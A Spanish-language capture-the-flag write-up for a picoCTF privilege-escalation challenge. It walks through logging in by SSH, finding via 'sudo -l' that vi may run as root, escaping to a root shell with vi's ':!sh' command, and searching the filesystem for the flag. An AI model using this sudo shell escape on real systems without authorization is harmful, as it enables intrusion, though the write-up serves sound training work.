#### Description

Can you read files in the root file?

Additional details will be available after launching your challenge instance.
SOLUCION

1. **Conexión via SSH**
    

`ssh -p 49180 picoplayer@saturn.picoctf.net # contraseña: NBD+zO8s4y`

2. **Enumeración inicial (desde el home)**
    

`ls -la`

Salida mostrada: contenido normal del home (`.bashrc`, `.profile`, `.cache`, etc.).

3. **Comprobar permisos `sudo`**
    

`sudo -l`

Salida relevante:

`User picoplayer may run the following commands on challenge:     (ALL) /usr/bin/vi`

→ El usuario puede ejecutar `/usr/bin/vi` como root.

4. **Obtener shell root usando `vi`**
    

`sudo /usr/bin/vi -c ':!sh' # dentro del shell: id`

Salida confirmatoria:

`uid=0(root) gid=0(root) groups=0(root)`

→ Ahora tenemos shell con privilegios root.

5. **Intento de lectura del flag conocido**
    

`cat /root/flag.txt`

Salida:

`cat: /root/flag.txt: No such file or directory`

→ En este sistema el flag no está en `/root/flag.txt`.

6. **Siguiente paso (búsqueda del flag)**  
    Como root, buscar archivos que contengan la palabra `picoCTF` o que tengan “flag” en el nombre:
    

`find / -type f \( -iname "*flag*" -o -iname "*secret*" \) 2>/dev/null grep -RIl "picoCTF" / 2>/dev/null ls -la /root`

(usar estas búsquedas hasta localizar el archivo con el flag).

---

## Notas adicionales (breves)

- **Vector de escalada usado:** `sudo` permitido para `/usr/bin/vi`. `vi` permite ejecutar comandos de shell (`:!sh`), lo que da un shell con UID 0.
    
- **Precaución:** No modificar archivos del sistema ni dejar puertas abiertas; solo leer el flag.
    
- **Formato esperado del flag:** `picoCTF{...}`.
    
- **Si no aparece `/root/flag.txt`:** el flag puede estar en otra ruta (ej. `/root/flag`, `/home/*/flag.txt`, `/opt/*`, `/tmp/*`) o nombrado distinto; usar `find`/`grep` como root para localizarlo.
    
- **Evidencia para entrega:** incluir captura o salida de `id` mostrando `uid=0(root)` y la línea de `sudo -l` que muestra `/usr/bin/vi`. Eso demuestra la técnica usada.
Referencias
https://www.youtube.com/watch?v=ZCM8pLNE2TE